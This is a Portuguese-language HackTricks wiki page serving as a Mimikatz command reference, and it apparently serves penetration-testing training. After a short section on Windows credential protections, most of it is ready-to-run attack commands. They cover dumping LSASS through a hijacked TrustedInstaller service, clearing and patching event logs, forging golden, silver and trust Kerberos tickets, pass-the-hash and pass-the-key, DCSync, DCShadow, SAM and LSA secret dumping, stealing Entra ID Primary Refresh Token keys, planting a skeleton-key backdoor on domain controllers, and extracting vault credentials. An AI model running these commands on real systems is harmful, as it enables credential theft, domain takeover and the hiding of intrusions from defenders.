# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Esta página é baseada em uma página do [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consulte o original para mais informações!<sup>[[3]](#references)</sup>

## LM e texto sem criptografia na memória

A partir do Windows 8.1 e do Windows Server 2012 R2, foram implementadas medidas significativas para proteger contra o roubo de credenciais:

- **Hashes LM e senhas em texto simples** não são mais armazenados na memória para aumentar a segurança. Uma configuração específica do registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve ser configurada com o valor DWORD `0` para desabilitar a Digest Authentication, garantindo que senhas em "texto sem criptografia" não sejam armazenadas em cache no LSASS.

- **LSA Protection** foi introduzida para proteger o processo Local Security Authority (LSA) contra leitura não autorizada da memória e injeção de código. Isso é feito marcando o LSASS como um processo protegido. A ativação da LSA Protection envolve:
  1. Modificar o registro em _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, definindo `RunAsPPL` como `dword:00000001`.
  2. Implementar um Group Policy Object (GPO) que aplique essa alteração no registro a todos os dispositivos gerenciados.

Apesar dessas proteções, ferramentas como o Mimikatz podem contornar a LSA Protection usando drivers específicos, embora essas ações provavelmente sejam registradas nos logs de eventos.

Em estações de trabalho modernas, isso é ainda mais relevante porque a **Credential Guard é habilitada por padrão em muitos sistemas Windows 11 22H2+ e Windows Server 2025 associados a um domínio e que não são DCs**, enquanto o **LSASS como PPL é habilitado por padrão em instalações novas do Windows 11 22H2+**. Na prática, isso significa que `sekurlsa::logonpasswords` costuma retornar menos informações do que as técnicas antigas faziam esperar, e os operadores recorrem cada vez mais a **minidumps offline**, **extração de chaves Kerberos (`sekurlsa::ekeys`)** ou **módulos voltados para CloudAP/PRT**. Para informações sobre as proteções, consulte [Windows credentials protections](credentials-protections.md).

### Contornando a remoção de SeDebugPrivilege

Em geral, os administradores têm SeDebugPrivilege, que permite depurar programas. Esse privilégio pode ser restringido para impedir despejos de memória não autorizados, uma técnica comum usada por atacantes para extrair credenciais da memória. No entanto, mesmo com esse privilégio removido, a conta TrustedInstaller ainda pode fazer despejos de memória usando uma configuração de serviço personalizada:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Isso permite fazer o dump da memória do `lsass.exe` para um arquivo, que pode então ser analisado em outro sistema para extrair credenciais:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Opções do Mimikatz

A adulteração dos logs de eventos no Mimikatz envolve duas ações principais: limpar os logs de eventos e aplicar patches no serviço Event para impedir o registro de novos eventos. Abaixo estão os comandos para executar essas ações:

#### Limpar logs de eventos

O Mimikatz oferece `event::clear`. Ele chama a API de limpeza de logs de eventos do Windows para o log clássico selecionado. O padrão é `Security`; `/log:` seleciona outro log, e o usuário precisa ter permissões para limpá-lo. Isso não é o mesmo que `event::drop`, que tenta impedir que novos registros sejam gravados.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Recurso experimental: Aplicação de patch no Event Service

- **Comando**: `event::drop`
- Este comando experimental foi projetado para modificar o comportamento do Event Logging Service, impedindo efetivamente que ele registre novos eventos.
- Exemplo: `mimikatz "privilege::debug" "event::drop" exit`

- O comando `privilege::debug` garante que o Mimikatz opere com os privilégios necessários para modificar serviços do sistema.
- Em seguida, o comando `event::drop` aplica um patch no Event Logging Service.

### Ataques a tickets Kerberos

Use os comandos abaixo como lembretes rápidos de sintaxe. As páginas dedicadas a [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) e [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contêm as informações atualizadas sobre nuances de AES/PAC/opsec.

### Criação de Golden Ticket

Um Golden Ticket permite a impersonação com acesso a todo o domínio. Comando e parâmetros principais:

- Comando: `kerberos::golden`
- Parâmetros:
  - `/domain`: O nome do domínio.
  - `/sid`: O Security Identifier (SID) do domínio.
  - `/user`: O nome de usuário a impersonar.
  - `/krbtgt`: O hash NTLM da conta de serviço KDC do domínio.
  - `/ptt`: Injeta diretamente o ticket na memória.
  - `/ticket`: Salva o ticket para uso posterior.

Exemplo:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Criação de Silver Ticket

Silver Tickets concedem acesso a serviços específicos. Comando e parâmetros principais:

- Comando: Semelhante ao Golden Ticket, mas direcionado a serviços específicos.
- Parâmetros:
  - `/service`: O serviço a ser alvo (por exemplo, cifs, http).
  - Outros parâmetros semelhantes aos do Golden Ticket.

Exemplo:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Criação de Trust Ticket

Trust Tickets são usados para acessar recursos entre domínios, aproveitando relações de confiança. Comando e parâmetros principais:

- Command: Similar ao Golden Ticket, mas para relações de confiança.
- Parameters:
  - `/target`: O FQDN do domínio de destino.
  - `/rc4`: O hash NTLM da conta de confiança.

Example:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Comandos Kerberos adicionais

- **Listar tickets**:

  - Comando: `kerberos::list`
  - Lista todos os tickets Kerberos da sessão atual do usuário.

- **Pass the Cache**: `kerberos::ptc` lê um arquivo MIT/Heimdal `.ccache`, **não** um arquivo `.kirbi`. Informe o caminho do arquivo como argumento posicional: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` lê um arquivo `.kirbi` ou um diretório com esses arquivos. Também recebe um caminho posicional, não `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Consulte [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) para conhecer o fluxo de trabalho mais amplo.<sup>[[6]](#references)</sup>

- **Limpar tickets**:
  - Comando: `kerberos::purge`
  - Remove todos os tickets Kerberos da sessão.
  - Útil antes de usar comandos de manipulação de tickets para evitar conflitos.

### Over-Pass-the-Hash / Pass-the-Key

Se `RC4` estiver desativado ou não for confiável, o Mimikatz pode injetar chaves Kerberos **AES128/AES256** na sessão de logon atual, em vez de usar apenas um hash NT. Isso costuma ser mais adequado para domínios modernos do que tratar `sekurlsa::pth` como exclusivo de NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` reutiliza o processo atual em vez de iniciar um novo console, o que é útil quando você quer executar imediatamente comandos como `lsadump::dcsync` no mesmo contexto.

### Adulteração do Active Directory

- **DCShadow**: Faça temporariamente uma máquina atuar como um DC para manipular objetos do AD. Consulte [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imite um DC para solicitar dados de senhas. Consulte [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acesso a credenciais

- **LSADUMP::LSA**: Extraia credenciais da LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Finja ser um DC usando os dados de senha de uma conta de computador.

  - _Nenhum comando específico para NetSync foi fornecido no contexto original._

- **LSADUMP::SAM**: Acesse o banco de dados SAM local.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descriptografe segredos armazenados no registro.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Defina um novo hash NTLM para um usuário.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupere informações de autenticação de confiança.
  - `mimikatz "lsadump::trust" exit`

### Credenciais na nuvem / Entra ID

Em hosts **Entra ID** ou **híbridos associados**, `sekurlsa::cloudap` pode expor material de **Primary Refresh Token (PRT)** em cache no LSASS. Seu `ProofOfPossesionKey.KeyValue` é o blob da chave de sessão protegido por DPAPI, não a chave já descriptografada.<sup>[[7]](#references)[[8]](#references)</sup> Para usar `/unprotect`, execute `dpapi::cloudapkd` como `SYSTEM` (por exemplo, `token::elevate` em uma sessão elevada do Mimikatz) ou primeiro preencha o cache de chaves do Mimikatz com `sekurlsa::dpapi`. `privilege::debug` sozinho não altera o contexto do chamador do DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Copie o `Context` e o `Derived Key` correspondentes do primeiro comando para o segundo; o Mimikatz gera um novo contexto quando nenhum é fornecido. Mesmo para uma chave protegida por TPM, o Mimikatz pode derivar uma chave de assinatura usando o TPM no dispositivo original. Não é necessário exportar a chave em texto claro, mas um resultado de chave derivada bem-sucedido pode assinar um cookie do navegador.<sup>[[7]](#references)</sup>

Uma string PRT, por si só, não é suficiente porque o Microsoft Entra exige prova de posse da chave de sessão associada.<sup>[[9]](#references)</sup> Consulte [recuperação de chaves DPAPI](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) para outras opções de master key e [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) para a cadeia do lado da cloud.

### Diversos

- **MISC::Skeleton**: Injeta um backdoor no LSASS em um DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalada de Privilégios

- **PRIVILEGE::Backup**: Adquire direitos de backup.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtém privilégios de depuração.
  - `mimikatz "privilege::debug" exit`

### Extração de Credenciais

- **SEKURLSA::LogonPasswords**: Exibe as credenciais dos usuários com sessão iniciada.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extrai tickets Kerberos da memória.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Manipulação de SID e Tokens

- **SID::add/modify**: Altera SID e SIDHistory.

  - Adicionar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Modificar: _Não há um comando específico para modificar no contexto original._

- **TOKEN::Elevate**: Representa tokens.
  - `mimikatz "token::elevate /domainadmin" exit`

### Serviços de Terminal

- **TS::MultiRDP**: Permite várias sessões RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lista sessões TS/RDP.
  - _Nenhum comando específico foi fornecido para TS::Sessions no contexto original._

### Cofre

- Extrai senhas do Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [As ferramentas do hacker – Módulos do Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB e Entra ID: conheça o novo fluxo de cache](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Referência de comandos do Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Código-fonte do módulo de eventos do Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Código-fonte do módulo ccache do Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Código-fonte do módulo Kerberos do Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Implementação de DPAPI do CloudAP no Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Investigando mais a fundo o Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Proteção do Primary Refresh Token do Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
